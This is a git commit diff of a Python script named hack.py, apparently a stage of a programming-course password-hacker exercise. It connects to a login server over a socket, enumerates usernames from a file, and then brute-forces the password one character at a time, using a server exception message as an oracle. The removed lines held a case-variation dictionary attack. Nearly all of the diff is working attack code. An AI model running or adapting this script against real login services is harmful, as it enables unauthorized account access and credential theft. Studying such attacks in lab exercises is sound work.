b28cec23dbd8ca5dc481befced608d6e51c460f3
Yerdaulet <47812867+syzygy17@users.noreply.github.com>
2021-01-14 00:24:12 +0600

    Stage 4/5
    Completed the fourth stage

--- hack.py
+++ hack.py
@@ -1,14 +1,12 @@
+import json
 import socket
 import sys
-import itertools
 
 
-def yield_variants(file):
-    with open(file, 'r') as pw_list:
-        for pw in pw_list:
-            for variation in \
-                    map(''.join, itertools.product(*(sorted({c.upper(), c.lower()}) for c in pw.strip('\n')))):
-                yield variation
+def yield_variants_logins(file):
+    with open(file, 'r') as logins_list:
+        for log_in in logins_list:
+            yield log_in.strip('\n')
 
 
 args = sys.argv
@@ -16,18 +14,43 @@ ip = str(args[1])
 port = int(args[2])
 buffer_size = 1024
 CONNECTION_SUCCESS = 'Connection success!'
+WRONG_PASSWORD = 'Wrong password!'
+EXCEPTION_DURING_LOGIN = 'Exception happened during login'
+password = ''
+i = 0
+char_set = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
 my_socket = socket.socket()
 address = (ip, port)
 my_socket.connect(address)
-passwords = yield_variants('passwords.txt')
+logins = yield_variants_logins('logins.txt')
+login_password_json = {
+    "login": "",
+    "password": " "
+}
 while True:
     try:
-        password = next(passwords)
-        my_socket.send(password.encode())
-        response = my_socket.recv(buffer_size)
-        if response.decode() == CONNECTION_SUCCESS:
-            print(password)
-            quit()
+        login = next(logins)
+        login_password_json["login"] = login
+        my_socket.send(json.dumps(login_password_json).encode())
+        response = json.loads(my_socket.recv(buffer_size).decode())
+        if response["result"] == WRONG_PASSWORD:
+            break
     except StopIteration:
         print('StopIteration')
+
+while True:
+    piece = char_set[i]
+    if i + 1 == 62:
+        i = 0
+    else:
+        i += 1
+    login_password_json["password"] = password + piece
+    my_socket.send(json.dumps(login_password_json).encode())
+    response = json.loads(my_socket.recv(buffer_size).decode())
+    if response["result"] == EXCEPTION_DURING_LOGIN:
+        password += piece
+    if response["result"] == CONNECTION_SUCCESS:
+        password += piece
+        break
+print(json.dumps(login_password_json))
